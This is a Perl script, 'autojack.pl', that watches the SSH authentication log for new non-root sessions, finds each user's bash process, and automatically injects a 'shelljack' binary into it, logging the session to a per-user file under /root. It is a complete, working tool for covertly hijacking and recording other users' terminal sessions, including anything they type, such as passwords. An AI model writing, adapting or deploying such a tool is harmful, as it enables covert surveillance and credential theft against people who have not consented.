#!/usr/bin/env perl
#
# autojack.pl - Auto-inject shelljack into new SSH sessions.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

use strict;
use warnings;

use constant SHELLJACK_BINARY => '/root/sj';
use constant LOGFILE          => '/root/.local/sj.log.%s.%d';

# Watch the auth.log for "session open for user X" entries.
my $SESSION_OPEN_RE = qr/^\w{3} [ :0-9]{11} [A-Za-z0-9]+ sshd\[([0-9]+)\]: pam_unix\(sshd:session\): session opened for user ([a-z0-9.-]+) by \(uid=[0-9]+\)$/;

sub main {
    open my $fh, '<', '/var/log/auth.log' or die "Cannot open /var/log/auth.log: $!";
    seek $fh, 0, 2;  # Seek to end of file

    while (1) {
        my $line = <$fh>;
        if (defined $line) {
            chomp $line;
            if ($line =~ $SESSION_OPEN_RE) {
                my ($sshd_pid, $user) = ($1, $2);
                next if $user eq 'root';  # Don't log root's own sessions

                my @out = `pgrep -P $sshd_pid -l 2>/dev/null`;
                chomp @out;

                my $found = 0;
                for (my $i = 0; $i < @out && !$found; $i++) {
                    next unless $out[$i];
                    my @parts = split /\s+/, $out[$i], 2;
                    next unless @parts == 2;

                    if ($parts[1] eq 'bash') {
                        print "Found a new bash process with PID $parts[0] for user $user! Injecting shelljack... ";
                        system(SHELLJACK_BINARY, '-f', sprintf(LOGFILE, $user, time), $parts[0]);
                        print "Done!\n";
                        $found = 1;
                    } elsif ($parts[1] eq 'sshd') {
                        my @more = `pgrep -P $parts[0] -l 2>/dev/null`;
                        chomp @more;
                        push @out, @more;
                    }
                }
            }
        } else {
            sleep 1;
        }
    }

    close $fh;
}

main() unless $ENV{FFPL_NO_RUN} || caller;
1;
